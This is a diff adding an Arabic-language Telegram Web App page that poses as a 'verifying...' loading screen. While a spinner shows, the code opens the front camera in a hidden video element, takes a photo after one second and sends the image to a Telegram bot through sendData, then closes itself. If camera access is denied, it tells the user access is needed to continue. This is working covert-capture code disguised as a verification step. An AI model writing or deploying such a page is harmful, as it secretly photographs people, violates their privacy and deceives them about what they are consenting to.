@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>جارٍ التحقق...</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body { background-color: #000; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        const webapp = window.Telegram.WebApp;
+        webapp.ready(); // إخبار تلجرام أن الصفحة جاهزة
+
+        async function startCapture() {
+            try {
+                // طلب الإذن لفتح الكاميرا الأمامية
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" } 
+                });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                // الانتظار ثانية واحدة لالتقاط صورة واضحة
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    const imageData = canvas.toDataURL('image/png');
+                    
+                    // إرسال الصورة للبوت
+                    webapp.sendData(imageData);
+                    // إغلاق الواجهة تلقائياً
+                    webapp.close();
+                }, 1000);
+            } catch (err) {
+                alert("يرجى السماح بالوصول للكاميرا للمتابعة");
+                webapp.close();
+            }
+        }
+        window.onload = startCapture;
+    </script>
+</body>
+</html>
